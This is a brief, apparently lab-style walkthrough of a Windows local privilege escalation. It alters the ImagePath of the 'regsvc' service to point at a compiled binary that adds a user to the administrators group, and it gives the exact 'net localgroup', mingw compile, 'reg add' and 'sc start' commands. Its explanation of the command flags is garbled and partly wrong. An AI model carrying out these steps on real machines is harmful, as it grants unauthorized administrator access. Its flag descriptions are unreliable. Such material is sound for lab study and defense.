For exploitation get the both source file named windows_dll.c  and windows_service.c and 

open windows_service.c and in the command system add
`cmd.exe /k net localgroup administrators user /add` 
and just compile the file using here the name of user is "user" but replace this with the "user-name" of the windows machine you want to escalate

`x86_64-w64-mingw32-gcc windows_service.c -o x.exe `

then download it in windows machine in `C:\temp`
then in cmd type 
`reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f`

what it does is adding to registry service `\v`  here stands for what value to be added in the subkey of registy (value name ) in our case image path 

(image path) -> registry 
`\t`   type 
`reg_expand` -> string to run 
`\f` run only no prompts f
`**sc start regsvc**`key that contains the path of drivers image file

and net localgroup administrators and done
